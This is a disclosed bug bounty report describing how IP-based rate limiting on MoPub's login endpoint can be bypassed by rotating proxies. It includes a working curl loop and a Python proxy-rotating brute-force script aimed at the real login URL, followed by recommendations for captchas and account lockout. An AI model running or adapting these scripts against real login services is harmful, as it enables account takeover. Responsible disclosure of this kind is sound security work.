# Ability to bruteforce mopub account’s password due to lack of rate limitation protection using {ip rotation techniques}

## Report Details
- **Report ID**: 819930
- **URL**: https://hackerone.com/reports/819930
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-03-16T06:31:29.981Z
- **Disclosed**: 2020-07-10T17:21:54.216Z

## Reporter
- **Username**: updatelap
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
## Summary
I tried to guess on my account. I sent out nearly 1,000 requests, and I was virtually banned on request about 120. But when I changed my IP and tried logging in, I was logged into the account without any additional checks 

## Description:*

Your web authentication endpoint, https://app.mopub.com/web-client/api/user/login, (POST), currently protects against credentials brute-force attacks only by requests rate-limiting based on IP.  This bug could allow an attacker to bruteforce the password of mopub users. This happens because mopub developer not set rate limitation protection in login page

## Reproduction

To test this, send a POST request to "https://app.mopub.com/web-client/api/user/login" with the following parameters in the body:

```
{"username":"TARGET@exmple.com","password":"HACKEDP@SS"}
```

Using curl, we can run an attack against a list of password with a fixed username (in this example "TARGET@exmple.com"), You can use the following command to start guessing passwords from PASS_LIST Put in your list about 1000 passwords and start guessing. You will notice that you will be banned after several trials.

```
while read pass; do curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: ███████' -H $'Origin: https://app.mopub.com' -H $'Referer: https://app.mopub.com/login?next=/' -H $'Cookie: csrftoken=███████; _ga=██████; mp__mixpanel=%7B%22distinct_id%22%3A%20%███%22%2C%22%24device_id%22%3A%20%███████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ██████_mixpanel=%7B%22distinct_id%22%3A%20%22██████████%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22█████%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22████████%22%7D; mp_mixpanel__c=3' --data-binary $'{\"username\":\"alert.wids@gmail.com\",\"password\":\"$pass\"}'     $'https://app.mopub.com/web-client/api/user/login';done < PASS_LIST
```

__To bypass this protection__ a brute-force python script was developed that performs a login brute-force attack by rotating through these addresses, to never have a request refused. This effectively overcomes the IP-rate limiting and allows a full-fleged online brute-force attack at virtually unlimited speeds. 

```python
from proxy_requests.proxy_requests import ProxyRequests

class bcolors:
    BOLD = '\033[1m'
    CRED = '\033[91m'

Pass = ["12345","admin","user","root","love","love2020","uk2020","asdfg","qwerty12345","██████████","████████","█████","████","███","passwOrd","Password","████","█████████","R00T","█████████","███████","███████","████"]
array_length = len(Pass)

I = 0 
for I in range(array_length):
    r = ProxyRequests("https://app.mopub.com/web-client/api/user/login")
    r.set_headers({
        'x-csrftoken': '█████',
        'Origin': 'https://app.mopub.com',
        'Content-Type':'application/json',
        'Referer':'https://app.mopub.com/login?next=/',
        'Cookie': 'csrftoken=████████; _ga=█████; mp__mixpanel=%7B%22distinct_id%22%3A%20%████%22%2C%22%24device_id%22%3A%20%████████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ██████████_mixpanel=%7B%22distinct_id%22%3A%20%22████████%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22██████%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22███████%22%7D; mp_mixpanel__c=3'
    })
    r.post_with_headers({'username':'alert.wids@gmail.com','password':''+Pass[I]+''})
    if r.get_status_code() == 401 or r.get_status_code() == 400:
       print (bcolors.CRED + "[*-*] Incorrect password: " + Pass[I] + " | Res_status: " + str(r.get_status_code()), " | IP_Proxy:" + str(r.get_proxy_used()) + "]"  )
    elif r.get_status_code() == 204:
       print (bcolors.BOLD + "[*u*] Correct password: " + Pass[I] + " | Res_status: " + str(r.get_status_code()), " | IP_Proxy:" + str(r.get_proxy_used()) + "]" )
    I+= 1
```

## Recommendation: 
Implement a Captcha after a reasonable number of failed login attempts against one account at the application-layer. The Captcha should not only be shown to offending IP addresses, but to anyone who attempts to login to the account under attack. Another option is to enable an account lockout policy which effectively locks down an account that has been attacked (e.g. after 20 failed consecutive logins) and requires out-of-band validation by the real account owner (e.g. email, mobile) before becoming accessible again.

Best regards,

## Impact

A malicious user could run this against a huge list of mopub password with a fixed username, after that attack is finished he changes the password.  An attacker can freely bruteforce any username and can takeover any account

## Attachments
No attachments
